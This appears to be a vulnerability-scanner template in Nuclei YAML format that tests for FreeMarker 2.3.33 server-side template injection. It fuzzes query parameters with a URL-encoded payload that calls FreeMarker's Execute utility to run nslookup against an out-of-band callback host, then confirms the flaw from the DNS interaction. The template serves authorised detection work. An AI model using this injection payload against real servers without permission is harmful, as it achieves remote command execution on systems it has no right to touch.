id: freemarker-oob

info:
  name: Freemarker 2.3.33 - Out of Band Template Injection
  author: 0xAwali,DhiyaneshDK
  severity: unknown
  reference:
    - https://mvnrepository.com/artifact/org.freemarker/freemarker
    - https://medium.com/@0xAwali/template-engines-injection-101-4f2fe59e5756
  metadata:
    verified: true
  tags: ssti,dast,oast,oob

http:
  - pre-condition:
      - type: dsl
        dsl:
          - 'method == "GET"'

    payloads:
      injection:
        - '%3C%23assign%20rce%3D%22freemarker.template.utility.Execute%22%3Fnew%28%29%3E%20%24%7B%20rce%28%22nslookup%20{{interactsh-url}}%22%29%20%7D' #Freemarker 2.3.33

    fuzzing:
      - part: query
        type: postfix
        mode: single
        fuzz:
          - "{{injection}}"

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol # Confirms the DNS Interaction
        words:
          - "dns"